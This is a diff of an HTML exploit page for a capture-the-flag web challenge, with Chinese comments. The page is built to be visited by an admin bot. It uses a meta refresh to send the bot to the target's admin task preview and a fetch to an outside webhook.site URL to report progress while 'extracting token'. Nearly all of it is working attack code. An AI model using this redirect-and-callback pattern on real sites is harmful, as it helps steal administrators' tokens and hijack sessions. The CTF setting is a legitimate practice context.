@@ -1,24 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta http-equiv="refresh" content="2; url=http://fnxek7pz6fqgwxn9a8lb214iuqlpd2.simpletasks.web.jctf.pro/tasks/preview/0/0">
   <title>CTF Exploit</title>
 </head>
 <body>
-  <h1>Extracting admin token...</h1>
-  
-  <!-- 隐藏表单，用于重定向 -->
-  <form id="redirect-form" action="http://fnxek7pz6fqgwxn9a8lb214iuqlpd2.simpletasks.web.jctf.pro/tasks/preview/0/0" method="GET" style="display:none;">
-    <input type="hidden" name="callback" value="https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98">
-  </form>
+  <h1>Extracting token...</h1>
+  <p>Bot访问了这个页面，即将重定向到admin任务...</p>
   
   <script>
-    // 通知webhook bot已访问
-    fetch('http://fnxek7pz6fqgwxn9a8lb214iuqlpd2.simpletasks.web.jctf.pro?status=bot_here').catch(() => {});
-    
-    // 1秒后提交表单，重定向到admin preview页面
-    setTimeout(() => {
-      document.getElementById('redirect-form').submit();
-    }, 1000);
+    // 发送确认消息
+    fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?event=redirect_initiated').catch(() => {});
   </script>
 </body>
 </html>
